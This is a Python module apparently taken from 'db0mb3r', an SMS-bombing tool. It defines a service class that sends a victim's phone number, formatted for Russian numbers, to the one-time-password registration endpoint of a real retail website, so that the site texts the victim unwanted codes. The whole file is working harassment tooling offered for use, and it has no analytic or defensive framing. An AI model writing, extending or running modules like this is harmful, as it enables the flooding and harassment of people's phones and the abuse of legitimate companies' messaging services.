from db0mb3r.services.service import Service


class Kristalnaya(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://kristalnaya.ru/ajax/ajax.php?action=send_one_pas_reg",
            data={
                "data": '{"phone":"%s"}'
                % self.format(self.formatted_phone, "+* (***) ***-**-**"),
            },
        )
